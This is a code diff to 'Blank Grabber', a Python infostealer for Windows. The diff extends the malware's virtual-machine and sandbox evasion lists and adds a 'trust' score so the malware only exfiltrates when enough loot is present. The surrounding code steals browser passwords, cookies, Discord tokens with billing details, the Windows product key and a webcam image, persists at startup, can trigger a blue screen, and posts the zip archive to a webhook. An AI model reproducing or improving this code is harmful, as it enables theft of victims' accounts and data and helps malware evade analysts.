@@ -5,7 +5,7 @@ PINGME = True # Pings @everyone
 VMPROTECT = True # Tries to protect your webhook from VMs
 BSOD = True # Tries to trigger Blue Screen if VM detected
 STARTUP = True # Puts the grabber in startup (and hide it)
-HIDE_ITSELF = True # Hide the Grabber
+HIDE_ITSELF = True # Hides the Grabber
 
 import os
 if os.name!='nt':
@@ -62,10 +62,10 @@ class vmprotect:
         if subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] in ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]:
             fquit(True)
 
-        if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl"]:
+        if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "harry johnson"]:
             fquit(True)
 
-        if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh"]:
+        if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "compname_5076"]:
             fquit(True)
 
         tasks = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
@@ -101,19 +101,18 @@ def MUTEX():
 
 class BlankGrabber:
     def __init__(self):
+        self.trust = 0
         self.webhook = WEBHOOK
         self.getPKey()
         self.archive = f"{os.getenv('temp')}\\Blank-{os.getlogin()}.zip"
         self.tempfolder = os.getenv('temp')+'\\'+generate(10)
         self.system = self.tempfolder + "\\System"
-        self.tempfolder2 = os.getenv('temp')+'\\'+generate(9)
         self.localappdata = os.getenv('localappdata')
         self.roaming = os.getenv('appdata')
         self.chromefolder = f"{self.localappdata}\\Google\\Chrome\\User Data"
         try:
             os.mkdir(self.tempfolder)
             os.mkdir(self.system)
-            os.mkdir(self.tempfolder2)
         except FileExistsError:
             pass
         except Exception:
@@ -169,6 +168,7 @@ class BlankGrabber:
             img.save(self.tempfolder + "/Webcam.png", "png")
         os.remove(sys._MEIPASS + "/Webcam.bmp")
         os.remove(sys._MEIPASS + "/cm.bam")
+        self.trust += 1
         
     def getPKey(self):
         key = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode().strip()
@@ -195,7 +195,9 @@ class BlankGrabber:
         subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
         subprocess.run(f"pm.bam /stext {os.path.abspath(self.tempfolder)}/Passwords.txt", cwd= sys._MEIPASS, capture_output= True, shell= True)
         os.remove(sys._MEIPASS + "/pm.bam")
-        
+        with open(self.tempfolder + '/Passwords.txt') as file:
+            if len(file.readlines()) > 100:
+                self.trust += 1
 
     def getcookie(self):
         if not hasattr(sys, 'frozen'):
@@ -203,6 +205,9 @@ class BlankGrabber:
         subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
         subprocess.run(f"ck.bam /stext {os.path.abspath(self.tempfolder)}/Cookies.txt", cwd= sys._MEIPASS, capture_output= True, shell= True)
         os.remove(sys._MEIPASS + "/ck.bam")
+        with open(self.tempfolder + '/Cookies.txt') as file:
+            if len(file.readlines()) > 100:
+                self.trust += 1
 
     def bypass_bd(self):
         try:
@@ -303,6 +308,7 @@ class BlankGrabber:
                 billing = len(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).json())>0
                 data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
         if len(data)!= 0:
+            self.trust += 3
             with open(self.tempfolder+'/Discord Info.txt', 'w', errors="ignore") as file:
                 file.write("\n\n".join(data))
 
@@ -364,6 +370,8 @@ class BlankGrabber:
   "username": "Blank Grabber",
   "avatar_url": "https://i.imgur.com/72yOkd1.jpg"
 }
+        if self.trust < 3:
+            fquit(True)
         requests.post(self.webhook, json = payload)
         with open(self.archive,'rb') as file:
             requests.post(self.webhook, files = {"file": file})
@@ -371,7 +379,6 @@ class BlankGrabber:
         try:
             os.remove(self.archive)
             shutil.rmtree(self.tempfolder)
-            shutil.rmtree(self.tempfolder2)
         except Exception:
             pass
 
